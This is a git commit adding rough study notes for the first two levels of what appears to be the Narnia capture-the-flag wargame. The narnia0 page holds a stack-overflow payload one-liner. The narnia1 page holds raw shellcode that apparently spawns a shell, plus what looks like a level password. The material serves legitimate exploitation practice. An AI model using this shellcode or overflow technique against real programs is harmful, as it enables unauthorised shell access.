1604f965c6e3cdff44ddad8d83a03454c94f8106
Ryan Nathan Mulyadi <r.mulyadi@student.unsw.edu.au>
2022-04-10 00:00:13 +1000

    Added rough narnia entries

---
+++ pages/narnia/narnia0.tsx
@@ -0,0 +1,12 @@
+const narnia0 = () => {
+  return (
+    <div>
+      {`python -c 'print("a"*20 +"\xef\xbe\xad\xde")' | ./narnia0`}
+      confusing at the end, had to look for location of the password.
+      Leartn about etc/bin?
+      main vulnerability in not matching size with scanf max length input
+      /etc/narnia_pass/narnia1
+    </div>
+  )
+}
+export default narnia0
---
+++ pages/narnia/narnia1.tsx
@@ -0,0 +1,17 @@
+import CodeBlock from "../../components/elements/CodeBlock/CodeBlock"
+
+const narnia1 = () => {
+  return (
+    <div>
+      The getenv() function searches the environment list to find the
+       environment variable name, and returns a pointer to the
+       corresponding value string.
+       will execute otherwise, need to change ENV EGG
+       <CodeBlock language="shell">
+        export EGG=`python -c &apos;print(&quot;\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80&quot;)&apos;`
+       </CodeBlock>
+       nairiepecu
+    </div>
+  )
+}
+export default narnia1
